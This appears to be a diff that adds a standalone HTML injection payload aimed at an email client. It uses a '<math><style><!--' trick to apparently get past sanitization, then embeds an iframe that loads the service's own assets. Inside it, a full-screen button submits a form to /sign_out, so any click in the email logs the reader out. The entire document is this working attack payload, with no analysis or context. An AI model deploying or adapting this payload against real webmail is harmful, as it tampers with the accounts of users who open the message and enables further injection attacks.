@@ -1,0 +1,13 @@
+<math><style><!--</style><iframe style="display:block;width:100vw;height:500px;background-color:white;border:none" srcdoc='
+<head>
+	<link rel="stylesheet" media="all" href="https://production.haystack-assets.com/assets/desktop-d09883b422ac6f535283737a5dbd38f04317d5e2fc38382c2126e1dc36c43540.css" data-turbolinks-track="reload">
+	<link rel="stylesheet" media="none" href="https://production.haystack-assets.com/assets/message_content-440db27e87f76e0aff765fa3bda981d5ecb10a198a4d57f99414a86befdd9d86.css" id="message_content_stylesheet" data-turbolinks-track="reload">
+	<script src="https://production.haystack-assets.com/packs/js/main-1f72ef27d9691193db7f.js" defer="defer" data-turbolinks-track="reload"></script>
+	<meta name="csrf-param" content="authenticity_token">
+</head>
+<body>
+<form action="/sign_out" method="post">
+        <button style="display:block;width:100vw;height:100vh;background-color:white;border:none;color:black" name="button" type="submit">click somewhere in this email!</button>
+</form>
+</body>'></iframe>
+<style>--></style>
